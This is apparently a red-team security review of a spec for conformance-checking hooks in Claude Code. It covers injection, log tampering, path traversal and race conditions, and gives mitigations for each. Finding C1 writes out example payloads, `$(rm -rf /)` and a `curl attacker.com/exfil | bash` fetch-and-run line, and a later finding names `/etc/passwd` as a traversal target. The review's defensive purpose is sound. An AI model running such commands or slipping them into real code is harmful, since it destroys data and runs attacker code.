# Round 1 Review — Security Skeptic (Red)

**Spec:** CIA-396 — Prototype tool capture hooks for spec conformance
**Reviewer:** Security Skeptic
**Date:** 2026-02-15

## Review Lens

Attack vectors, injection risks, data handling, auth boundaries, privilege escalation.

---

## Critical Findings

### C1: Arbitrary Code Execution via Spec Injection

**Severity:** HIGH

The spec proposes comparing "file changes against active spec acceptance criteria" without specifying how the spec is loaded or parsed. If `SDD_SPEC_PATH` points to a user-controlled file, an attacker could craft a malicious spec containing shell metacharacters or command injection payloads.

Example attack:
```markdown
## Acceptance Criteria
- [ ] Files matching pattern `$(rm -rf /)`
- [ ] Changes implement `; curl attacker.com/exfil | bash`
```

If the hook naively parses these criteria using bash string operations or eval, arbitrary code execution is trivial.

**Mitigation:**
1. Validate `SDD_SPEC_PATH` is within the project root and under version control
2. Use a safe markdown parser (NOT bash string manipulation)
3. Sanitize extracted criteria before any shell operations
4. Whitelist allowed characters in criterion text (alphanumeric, spaces, common punctuation only)

---

### C2: Tool Output Tampering

**Severity:** MEDIUM-HIGH

The hook reads tool output from stdin via `TOOL_OUTPUT=$(cat)`. If Claude Code's tool output JSON contains user-controlled strings (e.g., file paths, diff content from user input), an attacker could inject malicious JSON that breaks jq parsing or injects false conformance data.

Example: A file named `"file.txt", "matched": true, "extra":` could break JSON parsing and cause the hook to skip validation.

**Mitigation:**
1. Validate tool output JSON structure before parsing
2. Use jq's `-e` flag to exit on parse errors
3. Never trust file paths or diff content without validation
4. Implement schema validation for expected tool output structure

---

### C3: Log File Injection

**Severity:** MEDIUM

The spec mentions false positive rate measurement and per-criterion conformance logging. If conformance logs are written to `.sdd-conformance-log.jsonl` without sanitization, an attacker could inject newlines or malicious JSON into criterion text, poisoning the log.

Example criterion:
```markdown
- [ ] Implement feature\n{"timestamp":"...","matched":true,"criterion":"fake admin access"}
```

Downstream log analysis could be fooled into accepting fake conformance records.

**Mitigation:**
1. JSON-escape all criterion text before logging
2. Use structured logging libraries instead of string concatenation
3. Validate log file permissions (owner-write-only, 600)
4. Sign log entries with HMAC if tampering is a concern

---

## Important Findings

### I1: Race Condition on Concurrent Writes

**Severity:** LOW-MEDIUM

If multiple Claude instances run hooks concurrently (e.g., parallel sessions in a shared project), writes to `.sdd-conformance-log.jsonl` could interleave or corrupt. JSONL files are append-only but not atomic without file locking.

**Impact:** False positive rate calculations could include corrupted records, leading to incorrect decisions.

**Mitigation:**
- Use advisory file locking (`flock`) before appending to log
- Or write to session-specific log files and consolidate later

---

### I2: No Privilege Separation

**Severity:** LOW

The hook runs with the same privileges as the Claude Code process. If Claude Code has excessive permissions (e.g., sudo access, write access to sensitive directories), a hook bug or compromise could escalate.

**Impact:** Limited — hooks are designed to be defensive, but bugs could be weaponized.

**Mitigation:**
- Run hooks in a sandboxed environment (Docker, VM)
- Use file system permissions to restrict hook write scope
- Consider running hooks as a separate unprivileged user

---

### I3: Spec Path Traversal

**Severity:** MEDIUM

If `SDD_SPEC_PATH` is set via environment variable and not validated, an attacker with env var control could point it to `/etc/passwd`, `.git/config`, or other sensitive files. The hook would parse these as specs, potentially leaking content via error messages or logs.

**Mitigation:**
- Canonicalize `SDD_SPEC_PATH` and verify it's within the project root
- Reject paths containing `..`, symlinks to outside project, or absolute paths outside repo
- Fail closed if path validation fails

---

## Consider

### S1: Timing Side Channels

If conformance checking takes significantly longer for certain criteria (e.g., regex matching vs exact string matching), an attacker could infer spec structure by measuring hook execution time.

**Relevance:** LOW — most projects are not adversarial. Note for high-security contexts.

---

### S2: False Positive Evasion

The spec gates adoption on "<10% false positives." If the conformance matching logic is deterministic and known, an attacker could craft changes that deliberately pass conformance checks while implementing malicious behavior.

Example: Criterion "Implement authentication" could be satisfied by adding a no-op `def authenticate(): pass` function.

**Relevance:** MEDIUM — this is a limitations-of-static-analysis problem, not a hook-specific vulnerability. Note as inherent risk.

---

### S3: Denial of Service via Complex Specs

If spec parsing or criterion matching is O(n²) or worse, an attacker could craft a spec with thousands of acceptance criteria to slow or crash the hook.

**Relevance:** LOW-MEDIUM — 10-issue sample test will catch this if criteria counts are realistic. Suggest timeout for hook execution.

---

## What the Spec Gets Right

1. **Gating on false positive rate** — Explicitly recognizes that over-enforcement is a risk. This is the right instinct.

2. **10-issue sample testing** — Empirical validation before adoption reduces the chance of deploying a broken hook.

3. **Validation criteria with measurable thresholds** — "<10% false positives" and "Catches 2+ drift instances per 10-issue sample" are testable, not vague.

4. **Explicit decision gate** — "Decision: adopt, modify, or reject" forces a deliberate choice, not silent rollout.

---

## Quality Score

| Dimension | Score (1-5) | Rationale |
|-----------|-------------|-----------|
| **Security** | 2 | No spec parsing safety, no input validation, no log injection protection |
| **Robustness** | 3 | Race conditions possible, no error handling specified |
| **Clarity** | 4 | Requirements are clear, but security implications not addressed |
| **Testability** | 4 | 10-issue sample + false positive rate are measurable |
| **Completeness** | 2 | Missing: spec validation, input sanitization, error handling, logging safety |

**Overall:** 3.0 / 5.0

---

## Recommendation

**REVISE**

The core concept — write-time conformance checking — is valuable. However, the spec is critically incomplete on security:

1. Spec parsing and criterion extraction is a untrusted-input problem that MUST be addressed before implementation.
2. Tool output parsing needs schema validation and sanitization.
3. Log injection risks make false positive rate measurement unreliable without mitigation.

**Required changes:**
- Add acceptance criterion: "Spec path validated within project root"
- Add acceptance criterion: "Criterion text sanitized before shell operations"
- Add acceptance criterion: "Log entries JSON-escaped and atomic"
- Add acceptance criterion: "Tool output schema validated before parsing"

Without these, the prototype could introduce vulnerabilities worse than the drift problem it solves.
